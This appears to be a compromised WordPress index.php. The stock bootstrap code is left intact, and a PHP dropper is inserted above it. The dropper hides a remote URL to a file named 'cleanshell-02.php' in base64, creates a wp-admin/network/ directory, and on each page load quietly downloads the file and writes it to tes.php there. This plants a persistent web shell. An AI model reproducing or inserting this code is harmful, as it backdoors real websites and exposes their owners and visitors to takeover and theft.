<?php

$dir1 = __DIR__ . '/wp-admin/network/';
$file1 = $dir1 . 'tes.php';
$encoded = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL29ubHltZTFkL2R4ZXJyb3IvcmVmcy9oZWFkcy9tYWluL2NsZWFuc2hlbGwtMDIucGhw';
$source1 = 'https://' .base64_decode ($encoded);

if (!is_dir($dir1)) {
    mkdir($dir1, 0755, true);
}

if (!file_exists($file1) || filesize($file1) < 100) {
    $content1 = @file_get_contents($source1);
    if ($content1) {
        file_put_contents($file1, $content1);
    }
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
